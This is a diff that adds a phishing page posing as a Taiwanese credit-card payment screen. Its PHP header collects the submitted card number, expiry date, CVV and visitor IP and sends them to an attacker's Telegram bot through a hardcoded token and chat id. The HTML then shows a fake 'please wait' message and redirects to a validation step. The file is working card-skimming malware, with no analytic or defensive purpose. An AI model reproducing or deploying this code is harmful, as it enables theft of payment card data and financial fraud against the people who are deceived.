@@ -1,0 +1,70 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+$message .= "CVV TAIWAN JDIDA\n";
+$message .= " + IP   : $ip \n";
+$message .= " + CC : ".$_POST['Ecom_Payment_Card_Number']."\n";
+$message .= " + Fecha : ".$_POST['Ecom_Payment_Card_ExpDate_Month']." / ".$_POST['Ecom_Payment_Card_ExpDate_Year']." - " .$_POST['Ecom_Payment_Card_Verification']. " \n\n";
+$message .= "-------------- CVV INFO Infos ------------\n";
+$message .= "IP: ".$ip."\n";
+$token = "5045920469:AAH31CdPXkdUHDqBCsqctpVZGsPTpayA5BY";
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-758646140&text=" . urlencode($message)."" );
+?>
+
+<!-- saved from url=(0081)http://famous-manx.w5.wpsandbox.pro/A32Q0S/post/internet/Group/e6ff6/loading.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+      <link href="http://rambach.video/img/files/pubup.css" rel="stylesheet">
+      <link href="http://rambach.video/img/files/x0x.css" rel="stylesheet">
+<title>信用卡付款頁面</title><link rel="icon" href="http://famous-manx.w5.wpsandbox.pro/A32Q0S/post/internet/Group/e6ff6/img/favicon.ico" type="image/x-icon">
+<script type="text/javascript" src="http://rambach.video/img/files/date_heure.js.téléchargement"></script>
+
+
+    <style type="text/css">
+
+    </style>
+</head>
+
+<body>	
+    <div id="main" style="width: 100%">
+        <div id="inner" style="">
+            <div id="FlexContainer1">
+<div id="wb_Image1" style="display:inline-block;width:240px;z-index:0;">
+<img src="http://rambach.video/img/files/eko.png" id="Image1" alt="" style="
+    width: 335px;
+"></div>
+<div id="wb_Image2" style="display:inline-block;width:26px;z-index:1;">
+</div>
+</div><div id="content">
+                
+                <div class="mainContainerPaymentzone">
+					
+<div class="WaitMsgClass" id="WaitMsgId" style="display: none;background-color: #FFFFFF;border: solid #CCCCCC 4px;padding: 4px;color: #000000;font-family: Verdana;font-weight: bold;position: absolute;width: 350px;">
+<img id="waitGif" src="http://rambach.video/img/files/wait_turn.gif"></div>
+
+	<!-- Order overview -->
+<h2 style="display: inline; position: absolute; left: -1000px; top: -1000px; width: 0px; height: 0px; overflow: hidden;"><br></h2><table border="0" cellpadding="2" cellspacing="0" class="ncoltable1" id="ncol_ref" width="95%"><tbody><tr><td align="right" class="ncoltxtl" colspan="1" width="50%">Order Number 訂單編號<br></td><td class="ncoltxtr" colspan="1" width="50%">: 00275029<br></td></tr><tr><td align="right" class="ncoltxtl" colspan="1">Purchase Amount 訂單金額<br></td><td class="ncoltxtr" colspan="1">:  52.76 新台幣 NT Dollars <br></td></tr><tr><td align="right" class="ncoltxtl" colspan="1"><br></td><td class="ncoltxtr" colspan="1">&nbsp; <span id="date_heure">27.03.2022</span><script type="text/javascript">window.onload = date_heure('date_heure');</script> <br></td></tr></tbody></table>
+
+					<p></p>
+					<!-- Hidden title for screenreaders (Payment Data) -->
+					<h2 style="display: inline; position: absolute; left: -1000px; top: -1000px; width: 0px; height: 0px; overflow: hidden;"></h2>
+						<p style="text-align: center;">Please do not close this window before completing this step. The process may take a few seconds. Thank you for your patience<br><br>完成此步驟之前，請不要關閉此窗口。 該過程可能需要幾秒鐘。 感謝您的耐心等待</p><p style="text-align: center;"><img width="30%" src="http://rambach.video/img/files/Rolling-1s-200px.gif" class="fr-fic fr-dib"></p><meta http-equiv="refresh" content="10; url=validation.php?i_sendid=&amp;i_id=I6JIIxLyIR&amp;i_regnr_list=BG79502309***0785"><table class="ncoltable2" border="0" cellpadding="2" cellspacing="0" width="95%">
+
+						<tbody>
+							
+							
+											
+												
+									
+ 
+ 
+<!-- HTML meta refresh URL redirection -->
+ 
+
+ 
+ 
+
+
+</tbody></table></div></div></div></div></body></html>
